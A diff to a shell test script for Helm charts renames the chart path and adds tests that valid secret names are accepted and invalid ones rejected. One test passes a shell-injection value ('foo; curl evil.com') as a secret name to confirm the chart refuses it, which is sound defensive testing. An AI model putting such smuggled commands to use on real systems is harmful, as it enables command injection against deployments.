@@ -48,6 +48,19 @@ assert_not_contains() {
   fi
 }
 
+run_test_should_fail() {
+  local name="$1"; shift
+  echo -n "  ${name}... "
+  local output
+  if output=$("$@" 2>&1); then
+    echo "FAILED (expected failure but succeeded)"
+    FAIL=$((FAIL + 1))
+  else
+    echo "OK (failed as expected)"
+    PASS=$((PASS + 1))
+  fi
+}
+
 SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI test@test"
 
 # ============================================================
@@ -97,14 +110,14 @@ echo ""
 echo "=== Sandbox Chart (no OIDC) ==="
 # ============================================================
 
-SB_DEFAULT="$(helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+SB_DEFAULT="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
   --set sshPublicKey="${SSH_KEY}" \
   --set inference.provider=gemini \
   --set inference.model=flash \
   --set inference.apiKey=test-key 2>&1)"
 run_test "renders without OIDC" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
     --set sshPublicKey="${SSH_KEY}" \
     --set inference.provider=gemini \
@@ -121,7 +134,7 @@ echo ""
 echo "=== Sandbox Chart (with OIDC) ==="
 # ============================================================
 
-SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
   --set sshPublicKey="${SSH_KEY}" \
   --set inference.provider=gemini \
@@ -129,7 +142,7 @@ SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
   --set inference.apiKey=test-key \
   --set-string oidc.token=eyJhbGciOiJSUzI1NiJ9.test 2>&1)"
 run_test "renders with OIDC token" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
     --set sshPublicKey="${SSH_KEY}" \
     --set inference.provider=gemini \
@@ -151,14 +164,14 @@ echo ""
 echo "=== Sandbox Chart (with ESO provider secret) ==="
 # ============================================================
 
-SB_ESO="$(helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+SB_ESO="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
   --set sshPublicKey="${SSH_KEY}" \
   --set inference.provider=gemini \
   --set inference.model=flash \
   --set inference.secretName=gemini 2>&1)"
 run_test "renders with ESO provider secret" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-sandbox" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
     --set sshPublicKey="${SSH_KEY}" \
     --set inference.provider=gemini \
@@ -168,6 +181,41 @@ run_test "renders with ESO provider secret" \
 assert_contains "${SB_ESO}" "secretName: gemini" "provider secret mounted in job"
 assert_contains "${SB_ESO}" "/provider-secret" "provider secret mount path present"
 assert_contains "${SB_ESO}" "provider-secret/api_key" "API key read from provider secret"
+
+# ============================================================
+echo ""
+echo "=== Secret Name Validation ==="
+# ============================================================
+
+run_test "accepts valid sshSecret name" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+    --set sandboxName=my-sandbox \
+    --set sshPublicKey="${SSH_KEY}" \
+    --set sshSecret=openshell-aap-ssh
+
+run_test "accepts valid inference secretName" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+    --set sandboxName=my-sandbox \
+    --set sshPublicKey="${SSH_KEY}" \
+    --set inference.secretName=my-inference-secret
+
+run_test_should_fail "rejects sshSecret with shell injection" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+    --set sandboxName=my-sandbox \
+    --set sshPublicKey="${SSH_KEY}" \
+    --set 'sshSecret=foo; curl evil.com'
+
+run_test_should_fail "rejects inference secretName with spaces" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+    --set sandboxName=my-sandbox \
+    --set sshPublicKey="${SSH_KEY}" \
+    --set 'inference.secretName=bad name'
+
+run_test_should_fail "rejects sshSecret starting with dash" \
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+    --set sandboxName=my-sandbox \
+    --set sshPublicKey="${SSH_KEY}" \
+    --set sshSecret=-invalid
 
 # ============================================================
 echo ""
